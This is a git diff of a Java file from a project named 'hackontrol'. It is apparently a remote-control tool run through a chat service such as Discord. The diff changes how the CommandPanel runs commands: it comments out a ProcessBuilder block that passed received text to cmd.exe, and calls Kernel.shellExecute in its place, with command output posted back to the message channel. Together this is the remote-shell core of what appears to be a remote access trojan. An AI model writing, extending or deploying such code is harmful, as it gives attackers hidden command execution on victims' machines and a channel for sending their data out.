@@ -1,11 +1,10 @@
 package com.khopan.hackontrol.panel;
 
 import java.io.File;
-import java.io.InputStream;
-import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.List;
 
+import com.khopan.hackontrol.library.Kernel;
 import com.khopan.hackontrol.registry.Registration;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.sendable.sender.MessageChannelSendable;
@@ -91,7 +90,7 @@ public class CommandPanel extends Panel {
 
 	private void process(String command) {
 		try {
-			ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", command);
+			/*ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", command);
 			builder.redirectErrorStream(true);
 			builder.directory(CommandPanel.CurrentDirectory);
 			InputStream stream = builder.start().getInputStream();
@@ -100,7 +99,11 @@ public class CommandPanel extends Panel {
 
 			for(String part : this.getParts(new String(data, StandardCharsets.UTF_8), 1992)) {
 				this.channel.sendMessage("```\n" + part + "\n```").queue();
-			}
+			}*/
+
+			Kernel.shellExecute(command, response -> {
+				this.channel.sendMessage('`' + response + '`').queue();
+			});
 		} catch(Throwable Errors) {
 			HackontrolError.throwable(MessageChannelSendable.of(this.channel), Errors);
 		}
